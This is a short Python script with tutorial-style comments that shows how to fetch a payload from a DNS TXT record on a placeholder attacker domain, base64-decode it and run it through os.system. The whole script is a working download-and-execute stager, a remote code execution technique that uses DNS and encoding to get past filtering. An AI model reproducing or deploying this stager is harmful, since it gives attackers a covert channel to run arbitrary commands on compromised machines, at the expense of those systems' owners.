## first we choose a command that is available on all linux systems
# example host
import subprocess
import base64
import re
import os
##first we retrieve our payload
x= subprocess.Popen(["host","-t","txt","Our-domain_here.txt"], stdout=subprocess.PIPE).communicate()[0]
y = re.findall('"([^"]*)"', x)[0]

print(y) ## for your understanding
##then we b64 decode it, b64 encoding allows us to send over a really complex payload
c= base64.b64decode(y)
print(c) ## for your understanding
##now execute command
os.system(c)